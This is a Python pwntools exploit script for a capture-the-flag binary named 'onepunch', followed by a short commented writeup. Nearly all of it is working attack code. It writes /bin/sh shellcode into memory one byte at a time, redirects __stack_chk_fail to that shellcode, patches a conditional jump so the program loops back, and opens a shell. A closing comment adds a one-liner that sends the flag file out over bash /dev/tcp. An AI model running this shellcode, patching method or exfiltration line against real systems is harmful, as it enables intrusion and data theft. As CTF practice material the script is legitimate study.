from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
# context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
if len(sys.argv) == 1:
    r = process("./onepunch")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
sla("What?","0x400786 128")
# Step 1 Write shell code to bss
start = 0x400000
sc = '\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
for i in range(0,len(sc)):
    sla("What?",hex(start+i)+" "+str(ord(sc[i])))
stack_chk_fail = 0x0000000000601020
sla("What?",hex(stack_chk_fail)+" "+str(0))
sla("What?",hex(stack_chk_fail+1)+" "+str(0))
sla("What?",hex(stack_chk_fail+2)+" "+str(0x40))
sla("What?",hex(0x400785)+" "+str(0x75))
r.interactive()

'''
Writeup:
Old problem, from arbitrary modify one byte to shell out.
Notice that we will reach 0x0000000000400785 since we pass stack canary test.
   0x0000000000400785 <+147>:   je     0x40078c <main+154>
   0x0000000000400787 <+149>:   call   0x400570 <__stack_chk_fail@plt>
Assembly looks like   400785:       74 05                   je     40078c <main+0x9a>
We want to modify 0x05 to other value since that's the jump offset (It's well-known that 0x74 is je)
After some fuzzing we see that we modify 0x5 to 128 we'll jump back and won't crash.
The rest is just write shellcode to bss and I modify stack_chk_fail to shellcode address then trigger it.
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''

